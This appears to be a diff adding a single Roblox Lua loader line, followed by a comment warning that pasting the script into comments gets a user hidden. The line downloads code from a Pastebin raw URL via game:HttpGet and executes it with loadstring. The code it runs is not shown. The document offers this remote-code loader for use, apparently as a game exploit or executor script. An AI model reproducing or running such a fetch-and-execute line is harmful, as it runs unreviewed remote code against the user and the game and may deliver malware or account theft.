@@ -1,0 +1,2 @@
+loadstring(game:HttpGet(("https://pastebin.com/raw/yCrBkPaY"), true))()
+-- pasting this script in comments will get you ghosted (your comments wont be visible anymore)
